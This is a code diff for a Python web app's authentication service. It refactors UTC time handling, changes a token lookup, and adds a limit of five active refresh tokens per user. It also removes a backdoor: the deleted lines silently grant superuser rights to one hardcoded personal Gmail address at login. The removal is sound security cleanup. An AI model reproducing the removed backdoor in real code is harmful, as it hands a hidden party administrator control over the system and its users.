@@ -12,6 +12,7 @@ from starlette.concurrency import run_in_threadpool
 
 from app.core import security
 from app.core.config import get_settings
+from app.core.security import utc_now
 from app.models.team import Team
 from app.models.user import User
 from app.models.user_discipline_history import UserDisciplineHistory
@@ -106,8 +107,7 @@ class AuthService:
         new_stored = await self.refresh_token_repo.create(
             user_id=user.id,
             token_hash=new_token_hash,
-            expires_at=datetime.utcnow()
-            + timedelta(days=settings.REFRESH_TOKEN_EXPIRE_DAYS),
+            expires_at=utc_now() + timedelta(days=settings.REFRESH_TOKEN_EXPIRE_DAYS),
         )
         await self.refresh_token_repo.mark_replaced(stored.id, new_stored.id)
 
@@ -126,7 +126,7 @@ class AuthService:
             result = await self.refresh_token_repo.session.execute(
                 select(RefreshToken).where(RefreshToken.token_hash == token_hash)
             )
-            revoked_token = result.scalar_one_or_none()
+            revoked_token = result.scalars().first()
             if revoked_token and revoked_token.revoked:
                 # Reuse detected — revoke all tokens for this user
                 await self.refresh_token_repo.revoke_all_for_user(revoked_token.user_id)
@@ -139,7 +139,7 @@ class AuthService:
 
     async def _handle_user_login_metadata(self, user: User) -> None:
         """Update last_login_at and recover suspended users if applicable."""
-        now = datetime.utcnow()
+        now = utc_now()
         user.last_login_at = now
 
         # Normalize suspended_until to naive UTC for comparison
@@ -202,13 +202,6 @@ class AuthService:
         )
 
     async def _build_auth_result(self, user: User) -> AuthResult:
-        # 특정 이메일은 로그인 시 관리자 권한 강제 부여
-        if user.email == "dojyu1928@gmail.com" and not user.is_superuser:
-            user.is_superuser = True
-            self.user_repo.session.add(user)
-            await self.user_repo.session.commit()
-            await self.user_repo.session.refresh(user)
-
         teams = await self.team_repo.list_for_user(user.id)
         if not teams:
             default_team = await self.team_repo.create_default_team_for_user(
@@ -220,15 +213,15 @@ class AuthService:
         access_token = security.create_access_token(subject=str(user.id))
         raw_refresh_token = security.create_refresh_token()
 
-        # Store refresh token in DB
+        # Store refresh token in DB and enforce per-user limit
         settings = get_settings()
         token_hash = security.hash_refresh_token(raw_refresh_token)
         await self.refresh_token_repo.create(
             user_id=user.id,
             token_hash=token_hash,
-            expires_at=datetime.utcnow()
-            + timedelta(days=settings.REFRESH_TOKEN_EXPIRE_DAYS),
+            expires_at=utc_now() + timedelta(days=settings.REFRESH_TOKEN_EXPIRE_DAYS),
         )
+        await self.refresh_token_repo.evict_oldest_for_user(user.id, max_active=5)
 
         return AuthResult(
             access_token=access_token,
